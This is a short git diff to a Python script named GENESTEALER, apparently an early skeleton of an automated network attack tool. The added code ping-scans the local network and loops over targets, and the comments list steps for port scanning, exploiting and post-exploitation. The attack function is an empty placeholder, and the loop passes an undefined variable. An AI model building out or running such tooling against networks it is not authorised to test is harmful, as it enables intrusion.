@@ -3,6 +3,11 @@
 import argparse
 import pathlib
 from ipaddress import ip_address
+from scanner import scanner
+
+def attackTarget(targetIP):
+    #placeholder
+    return
 
 def attack(args):
     #step 1 perform target ping scan
@@ -10,6 +15,12 @@ def attack(args):
     #step 3 perform target port scan on necessary ports
     #step 4 pick and execute exploit
     #step 5 post exploit (potentially repeat 2 thru 4 on all targets in sequence)
+    internal_nmap = scanner()
+    ownIP = internal_nmap.getSelfIP()
+    targets = internal_nmap.ping_scan(ownIP)
+
+    for target in targets:
+        attackTarget(targetIP)
 
 def main():
     parser = argparse.ArgumentParser(prog="GENESTEALER")
